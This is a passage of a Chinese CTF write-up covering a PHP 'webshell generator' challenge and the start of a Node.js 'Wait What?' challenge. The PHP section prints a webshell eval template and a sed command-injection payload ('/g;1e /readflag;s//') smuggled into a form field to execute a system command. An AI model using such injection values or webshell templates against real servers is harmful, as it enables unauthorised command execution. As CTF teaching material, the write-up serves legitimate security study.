class="hljs-keyword">function</span> <span class="hljs-title">security_validate</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$_POST</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/\r|\n/&#x27;</span>, <span class="hljs-variable">$value</span>)) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;<span class="hljs-subst">$key</span> 不能包含换行符！&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$value</span>) &gt; <span class="hljs-number">114</span>) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;<span class="hljs-subst">$key</span> 不能超过114个字符！&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-title function_ invoke__">security_validate</span>();<br><span class="hljs-keyword">if</span> (@<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;method&#x27;</span>] &amp;&amp; @<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;key&#x27;</span>] &amp;&amp; @<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;filename&#x27;</span>]) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;language&#x27;</span>] !== <span class="hljs-string">&#x27;PHP&#x27;</span>) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;PHP是最好的语言&quot;</span>);<br>    &#125;<br>    <span class="hljs-variable">$method</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;method&#x27;</span>];<br>    <span class="hljs-variable">$key</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;key&#x27;</span>];<br>    <span class="hljs-title function_ invoke__">putenv</span>(<span class="hljs-string">&quot;METHOD=<span class="hljs-subst">$method</span>&quot;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;你的method太复杂了！&quot;</span>);<br>    <span class="hljs-title function_ invoke__">putenv</span>(<span class="hljs-string">&quot;KEY=<span class="hljs-subst">$key</span>&quot;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;你的key太复杂了！&quot;</span>);<br>    <span class="hljs-variable">$status_code</span> = -<span class="hljs-number">1</span>;<br>    <span class="hljs-variable">$filename</span> = <span class="hljs-title function_ invoke__">shell_exec</span>(<span class="hljs-string">&quot;sh generate.sh&quot;</span>);<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$filename</span>) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;生成失败了！&quot;</span>);<br>    &#125;<br>    <span class="hljs-variable">$filename</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$filename</span>);<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: download.php?file=<span class="hljs-subst">$filename</span>&amp;filename=<span class="hljs-subst">&#123;$_POST[&#x27;filename&#x27;]&#125;</span>&quot;</span>);<br>    <span class="hljs-keyword">exit</span>();<br>&#125;<br><span class="hljs-meta">?&gt;</span><br>&lt;html&gt;<br><br>&lt;head&gt;<br>    &lt;title&gt;Webshell生成器&lt;/title&gt;<br>    &lt;meta charset=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;<br>    &lt;style&gt;<br>        body &#123;<br>            background-color: <span class="hljs-comment">#f2f2f2;</span><br>            font-family: Arial, sans-serif;<br>        &#125;<br><br>        form &#123;<br>            margin: <span class="hljs-number">50</span>px auto;<br>            width: <span class="hljs-number">400</span>px;<br>            background-color: <span class="hljs-comment">#fff;</span><br>            padding: <span class="hljs-number">20</span>px;<br>            border-radius: <span class="hljs-number">10</span>px;<br>            box-shadow: <span class="hljs-number">0</span>px <span class="hljs-number">0</span>px <span class="hljs-number">10</span>px <span class="hljs-title function_ invoke__">rgba</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0.2</span>);<br>        &#125;<br><br>        h1 &#123;<br>            text-align: center;<br>            color: <span class="hljs-comment">#333;</span><br>        &#125;<br><br>        label &#123;<br>            display: block;<br>            margin-bottom: <span class="hljs-number">10</span>px;<br>            color: <span class="hljs-comment">#666;</span><br>        &#125;<br><br>        input[type=<span class="hljs-string">&quot;text&quot;</span>],<br>        select &#123;<br>            width: <span class="hljs-number">100</span>%;<br>            padding: <span class="hljs-number">10</span>px;<br>            border-radius: <span class="hljs-number">5</span>px;<br>            border: none;<br>            margin-bottom: <span class="hljs-number">20</span>px;<br>            box-sizing: border-box;<br>        &#125;<br><br>        input[type=<span class="hljs-string">&quot;submit&quot;</span>] &#123;<br>            background-color: <span class="hljs-comment">#4CAF50;</span><br>            color: <span class="hljs-comment">#fff;</span><br>            border: none;<br>            padding: <span class="hljs-number">10</span>px <span class="hljs-number">20</span>px;<br>            border-radius: <span class="hljs-number">5</span>px;<br>            cursor: pointer;<br>        &#125;<br><br>        input[type=<span class="hljs-string">&quot;submit&quot;</span>]:hover &#123;<br>            background-color: <span class="hljs-comment">#3e8e41;</span><br>        &#125;<br>    &lt;/style&gt;<br>&lt;/head&gt;<br><br>&lt;body&gt;<br>    &lt;form action=<span class="hljs-string">&quot;index.php&quot;</span> method=<span class="hljs-string">&quot;post&quot;</span>&gt;<br>        &lt;h1&gt;Webshell生成器&lt;/h1&gt;<br>        &lt;label <span class="hljs-keyword">for</span>=<span class="hljs-string">&quot;language&quot;</span>&gt;Webshell语言：&lt;/label&gt;<br>        &lt;select name=<span class="hljs-string">&quot;language&quot;</span> id=<span class="hljs-string">&quot;method&quot;</span>&gt;<br>            &lt;option value=<span class="hljs-string">&quot;PHP&quot;</span>&gt;PHP&lt;/option&gt;<br>            &lt;option value=<span class="hljs-string">&quot;PHP&quot;</span>&gt;PHP&lt;/option&gt;<br>            &lt;option value=<span class="hljs-string">&quot;PHP&quot;</span>&gt;PHP&lt;/option&gt;<br>            &lt;option value=<span class="hljs-string">&quot;PHP&quot;</span>&gt;PHP&lt;/option&gt;<br>            &lt;option value=<span class="hljs-string">&quot;PHP&quot;</span>&gt;PHP&lt;/option&gt;<br>            &lt;option value=<span class="hljs-string">&quot;PHP&quot;</span>&gt;PHP&lt;/option&gt;<br>            &lt;option value=<span class="hljs-string">&quot;PHP&quot;</span>&gt;PHP&lt;/option&gt;<br>            &lt;option value=<span class="hljs-string">&quot;PHP&quot;</span>&gt;PHP&lt;/option&gt;<br>            &lt;option value=<span class="hljs-string">&quot;PHP&quot;</span>&gt;PHP&lt;/option&gt;<br>            &lt;option value=<span class="hljs-string">&quot;PHP&quot;</span>&gt;PHP&lt;/option&gt;<br>        &lt;/select&gt;<br>        &lt;label <span class="hljs-keyword">for</span>=<span class="hljs-string">&quot;method&quot;</span>&gt;请求方法：&lt;/label&gt;<br>        &lt;select name=<span class="hljs-string">&quot;method&quot;</span> id=<span class="hljs-string">&quot;method&quot;</span>&gt;<br>            &lt;option value=<span class="hljs-string">&quot;POST&quot;</span>&gt;POST&lt;/option&gt;<br>            &lt;option value=<span class="hljs-string">&quot;GET&quot;</span>&gt;GET&lt;/option&gt;<br>            &lt;option value=<span class="hljs-string">&quot;REQUEST&quot;</span>&gt;REQUEST&lt;/option&gt;<br>        &lt;/select&gt;<br>        &lt;label <span class="hljs-keyword">for</span>=<span class="hljs-string">&quot;key&quot;</span>&gt;密钥：&lt;/label&gt;<br>        &lt;input name=<span class="hljs-string">&quot;key&quot;</span> type=<span class="hljs-string">&quot;text&quot;</span> value=<span class="hljs-string">&quot;114&quot;</span> pattern=<span class="hljs-string">&quot;[A-Za-z0-9]+&quot;</span> title=<span class="hljs-string">&quot;你的key太复杂了！简单点！o.O&quot;</span>&gt;<br>        &lt;label <span class="hljs-keyword">for</span>=<span class="hljs-string">&quot;filename&quot;</span>&gt;Webshell文件名称：&lt;/label&gt;<br>        &lt;input name=<span class="hljs-string">&quot;filename&quot;</span> type=<span class="hljs-string">&quot;text&quot;</span> value=<span class="hljs-string">&quot;webshell.php&quot;</span>&gt;<br>        &lt;input type=<span class="hljs-string">&quot;submit&quot;</span> value=<span class="hljs-string">&quot;生成你的专属Webshell！&quot;</span>&gt;<br>    &lt;/form&gt;<br>&lt;/body&gt;<br><span class="hljs-comment">//download.php</span><br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>    <span class="hljs-variable">$filename</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>];<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-type: application/octet-stream&quot;</span>);<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-Disposition: attachment; filename=<span class="hljs-subst">$filename</span>&quot;</span>);<br>    <span class="hljs-title function_ invoke__">readfile</span>(<span class="hljs-variable">$file</span>);<br>    <span class="hljs-keyword">exit</span>();<br>&#125;<br></code></pre></td></tr></table></figure><p>注意这里，执行了<code>shell</code>脚本文件：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">putenv</span>(<span class="hljs-string">&quot;METHOD=<span class="hljs-subst">$method</span>&quot;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;你的method太复杂了！&quot;</span>);<br>    <span class="hljs-title function_ invoke__">putenv</span>(<span class="hljs-string">&quot;KEY=<span class="hljs-subst">$key</span>&quot;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;你的key太复杂了！&quot;</span>);<br>    <span class="hljs-variable">$status_code</span> = -<span class="hljs-number">1</span>;<br>    <span class="hljs-variable">$filename</span> = <span class="hljs-title function_ invoke__">shell_exec</span>(<span class="hljs-string">&quot;sh generate.sh&quot;</span>);<br></code></pre></td></tr></table></figure><p>下载<code>generate.sh</code>文件，这东西大致意思就是对模板内容进行了替换：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">!/bin/sh</span><br><br>set -e<br><br>NEW_FILENAME=$(tr -dc a-z0-9 &lt;/dev/urandom | head -c 16)<br>cp template.php &quot;/tmp/$NEW_FILENAME&quot;<br>cd /tmp<br><br>sed -i &quot;s/KEY/$KEY/g&quot; &quot;$NEW_FILENAME&quot;<br>sed -i &quot;s/METHOD/$METHOD/g&quot; &quot;$NEW_FILENAME&quot;<br><br>realpath &quot;$NEW_FILENAME&quot;<br></code></pre></td></tr></table></figure><p><code>templete.php</code>:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_METHOD</span>[<span class="hljs-string">&quot;KEY&quot;</span>]);<br><br></code></pre></td></tr></table></figure><p>这题看着<code>wp</code>做的：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">/g;1e /readflag;s//<br>即:<br>sed -i &quot;s/KEY//g;1e /readflag;s///g&quot; &quot;$NEW_FILENAME&quot;<br></code></pre></td></tr></table></figure><p><code>s/KEY//g</code>这东西是个替换操作，将<code>$NEW_FILENAME</code>这个文件里所有的<code>KEY</code>都替换成空。<code>;</code>用来分隔多个<code>sed</code>命令。<code>e</code>这东西可以用来执行系统命令(比如<code>/readflag</code>)，前面加个<code>1</code>表示将执行结果插入到文件第一行。后面又用了一个<code>;</code>分割并将所有空字符串替换成空字符串。</p><p><code>KEY</code>和<code>METHOD</code>都可控，随便改一个就行。</p><p>最后注意这里：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;key&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;114&quot;</span> <span class="hljs-attr">pattern</span>=<span class="hljs-string">&quot;[A-Za-z0-9]+&quot;</span> <span class="hljs-attr">title</span>=<span class="hljs-string">&quot;你的key太复杂了！简单点！o.O&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><p>简单前端验证，抓包修改就行。</p><h3 id="Wait-What"><a href="#Wait-What" class="headerlink" title="Wait What?"></a>Wait What?</h3><blockquote><p>题目描述：这怎么可能呢？</p></blockquote><p><img src="/img/nctfwaitwhat1.png" alt="nctfwaitwhat1"></p><p><code>app.js</code>:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br></pre></td><td class="code"><pre><code class="hljs js"><br><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">const</span> child_process = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>)<br><span class="hljs-keyword">const</span> app = <span class="hljs-title function_">express</span>()<br>app.<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">json</span>())<br><span class="hljs-keyword">const</span> port = <span class="hljs-number">80</span><br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">escapeRegExp</span>(<span class="hljs-params">string</span>) &#123;<br>    <span class="hljs-keyword">return</span> string.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/[.*+?^$&#123;&#125;()|[\]\\]/g</span>, <span class="hljs-string">&#x27;\\$&amp;&#x27;</span>);<br>&#125;<br><br><span class="hljs-keyword">let</span> users = &#123;<br>    <span class="hljs-string">&quot;admin&quot;</span>: <span class="hljs-string">&quot;admin&quot;</span>,<br>    <span class="hljs-string">&quot;user&quot;</span>: <span class="hljs-string">&quot;user&quot;</span>,<br>    <span class="hljs-string">&quot;guest&quot;</span>: <span class="hljs-string">&quot;guest&quot;</span>,<br>    <span class="hljs-string">&#x27;hacker&#x27;</span>:<span class="hljs-string">&#x27;hacker&#x27;</span><br>&#125;<br><br><span class="hljs-keyword">let</span> banned_users = [<span class="hljs-string">&#x27;hacker&#x27;</span>]<br><br><span class="hljs-comment">// 你不准getflag</span><br>banned_users.<span class="hljs-title function_">push</span>(<span class="hljs-string">&quot;admin&quot;</span>) <br><br><span class="hljs-keyword">let</span> banned_users_regex = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">build_banned_users_regex</span>(<span class="hljs-params"></span>) &#123;<br><span class="hljs-keyword">let</span> regex_string = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> username <span class="hljs-keyword">of</span> banned_users) &#123;<br>        regex_string += <span class="hljs-string">&quot;^&quot;</span> + escapeRegExp(username) + <span class="hljs-string">&quot;$&quot;</span> + <span class="hljs-string">&quot;|&quot;</span><br>    &#125;<br>    regex_string = regex_string.<span class="hljs-title function_">substring</span>(<span class="hljs-number">0</span>, regex_string.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>)<br>    banned_users_regex = <span class="hljs-keyword">new</span> <span class="hljs-title class_">RegExp</span>(regex_string, <span class="hljs-string">&quot;g&quot;</span>)<br>&#125;<br><br><span class="hljs-comment">//鉴权中间件</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">requireLogin</span>(<span class="hljs-params">req, res, next</span>) &#123;<br>    <span class="hljs-keyword">let</span> username = req.<span class="hljs-property">body</span>.<span class="hljs-property">username</span><br>    <span class="hljs-keyword">let</span> password = req.<span class="hljs-property">body</span>.<span class="hljs-property">password</span><br>    <span class="hljs-keyword">if</span> (!username || !password) &#123;<br>        res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;用户名或密码不能为空&quot;</span>)<br>        <span class="hljs-keyword">return</span><br>    &#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> username !== <span class="hljs-string">&quot;string&quot;</span> || <span class="hljs-keyword">typeof</span> password !== <span class="hljs-string">&quot;string&quot;</span>) &#123;<br>        res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;用户名或密码不合法&quot;</span>)<br>        <span class="hljs-keyword">return</span><br>    &#125;<br>    <span class="hljs-comment">// 基于正则技术的封禁用户匹配系统的设计与实现</span><br>    <span class="hljs-keyword">let</span> test1 = banned_users_regex.<span class="hljs-title function_">test</span>(username)<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`使用正则<span class="hljs-subst">$&#123;banned_users_regex&#125;</span>匹配<span class="hljs-subst">$&#123;username&#125;</span>的结果为：<span class="hljs-subst">$&#123;test1&#125;</span>`</span>)<br>    <span class="hljs-keyword">if</span> (test1) &#123;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;第一个判断匹配到封禁用户：&quot;</span>,username)<br>        res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;用户&#x27;&quot;</span>+username + <span class="hljs-string">&quot;&#x27;被封禁，无法鉴权！&quot;</span>)<br>        <span class="hljs-keyword">return</span><br>    &#125;<br>    <span class="hljs-comment">// 基于in关键字的封禁用户匹配系统的设计与实现</span><br>    <span class="hljs-keyword">let</span> test2 = (username <span class="hljs-keyword">in</span> banned_users)<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`使用in关键字匹配<span class="hljs-subst">$&#123;username&#125;</span>的结果为：<span class="hljs-subst">$&#123;test2&#125;</span>`</span>)<br>    <span class="hljs-keyword">if</span> (test2)&#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;第二个判断匹配到封禁用户：&quot;</span>,username)<br>        res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;用户&#x27;&quot;</span>+username + <span class="hljs-string">&quot;&#x27;被封禁，无法鉴权！&quot;</span>)<br>        <span class="hljs-keyword">return</span><br>    &#125;<br>    <span class="hljs-keyword">if</span> (username <span class="hljs-keyword">in</span> users &amp;&amp; users[username] === password) &#123;<br>        <span class="hljs-title function_">next</span>()<br>        <span class="hljs-keyword">return</span><br>    &#125;<br>    res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;用户名或密码错误，鉴权失败！&quot;</span>)<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">registerUser</span>(<span class="hljs-params">username, password</span>) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> username !== <span class="hljs-string">&quot;string&quot;</span> || username.<span class="hljs-property">length</span> &gt; <span class="hljs-number">20</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;用户名不合法&quot;</span><br>    &#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> password !== <span class="hljs-string">&quot;string&quot;</span> || password.<span class="hljs-property">length</span> &gt; <span class="hljs-number">20</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;密码不合法&quot;</span><br>    &#125;<br>    <span class="hljs-keyword">if</span> (username <span class="hljs-keyword">in</span> users) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;用户已存在&quot;</span><br>    &#125;<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> existing_user <span class="hljs-keyword">in</span> users)&#123;<br>        <span class="hljs-keyword">let</span> existing_user_password = users[existing_user]<br>        <span class="hljs-keyword">if</span> (existing_user_password === password)&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">`您的密码已经被用户&#x27;<span class="hljs-subst">$&#123;existing_user&#125;</span>&#x27;使用了，请使用其它的密码`</span><br>        &#125;<br>    &#125;<br><br>    users[username] = password<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;注册成功&quot;</span><br>&#125;<br><br>app.<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">static</span>(<span class="hljs-string">&#x27;public&#x27;</span>))<br><br><span class="hljs-comment">// 每次请求前，更新封禁用户正则信息</span><br>app.<span class="hljs-title function_">use</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params">req, res, next</span>) &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-title function_">build_banned_users_regex</span>()<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;封禁用户正则表达式（满足这个正则表达式的用户名为被封禁用户名）：&quot;</span>,banned_users_regex)<br>    &#125; <span class="hljs-keyword">catch</span> (e) &#123;<br>    &#125;<br>    <span class="hljs-title function_">next</span>()<br>&#125;)<br><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&quot;/api/register&quot;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>    <span class="hljs-keyword">let</span> username = req.<span class="hljs-property">body</span>.<span class="hljs-property">username</span><br>    <span class="hljs-keyword">let</span> password = req.<span class="hljs-property">body</span>.<span class="hljs-property">password</span><br>    <span class="hljs-keyword">let</span> message = <span class="hljs-title function_">registerUser</span>(username, password)<br>    res.<span class="hljs-title function_">send</span>(message)<br>&#125;)<br><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&quot;/api/login&quot;</span>, requireLogin, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>    res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;登录成功！&quot;</span>)<br>&#125;)<br><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&quot;/api/flag&quot;</span>, requireLogin, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>    <span class="hljs-keyword">let</span> username = req.<span class="hljs-property">body</span>.<span class="hljs-property">username</span><br>    <span class="hljs-keyword">if</span> (username !== <span class="hljs-string">&quot;admin&quot;</span>) &#123;<br>        res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;登录成功，但是只有&#x27;admin&#x27;用户可以看到flag，你的用户名是&#x27;&quot;</span> + username + <span class="hljs-string">&quot;&#x27;&quot;</span>)<br>        <span class="hljs-keyword">return</span><br>    &#125;<br>    <span class="hljs-keyword">let</span> flag = child_process.<span class="hljs-title function_">execSync</span>(<span class="hljs-string">&quot;cat flag&quot;</span>).<span class="hljs-title function_">toString</span>()<br>    res.<span class="hljs-title function_">end</span>(flag)<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">&quot;有人获取到了flag！为了保证题目的正常运行，将会重置靶机环境！&quot;</span>)<br>    res.<span class="hljs-title function_">on</span>(<span class="hljs-string">&quot;finish&quot;</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>        <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> &#123; process.<span class="hljs-title function_">exit</span>(<span class="hljs-number">0</span>) &#125;, <span class="hljs-number">1</span>)<br>    &#125;)<br>    <span class="hljs-keyword">return</span><br>&#125;)<br><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/api/ban_user&#x27;</span>, requireLogin, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>    <span class="hljs-keyword">let</span> username = req.<span class="hljs-property">body</span>.<span class="hljs-property">username</span><br>    <span class="hljs-keyword">let</span> ban_username = req.<span class="hljs-property">body</span>.<span class="hljs-property">ban_username</span><br>    <span class="hljs-keyword">if</span>(!ban_username)&#123;<br>        res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;ban_username不能为空&quot;</span>)<br>        <span class="hljs-keyword">return</span><br>    &#125;<br>    <span class="hljs-keyword">if</span>(username === ban_username)&#123;<br>        res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;不能封禁自己&quot;</span>)<br>        <span class="hljs-keyword">return</span><br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> name <span class="hljs-keyword">of</span> banned_users)&#123;<br>        <span class="hljs-keyword">if</span> (name === ban_username) &#123;<br>            res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;用户已经被封禁&quot;</span>)<br>            <span class="hljs-keyword">return</span><br>        &#125;<br>    &#125;<br>    banned_users.<span class="hljs-title function_">push</span>(ban_username)<br>    res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;封禁成功！&quot;</span>)<br>&#125;)<br><br><br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&quot;/&quot;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>    res.<span class="hljs-title function_">redirect</span>(<span class="hljs-string">&quot;/static/index.html&quot;</span>)<br>&#125;)<br><br>app.<span class="hljs-title function_">listen</span>(port, <span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`listening on port <span 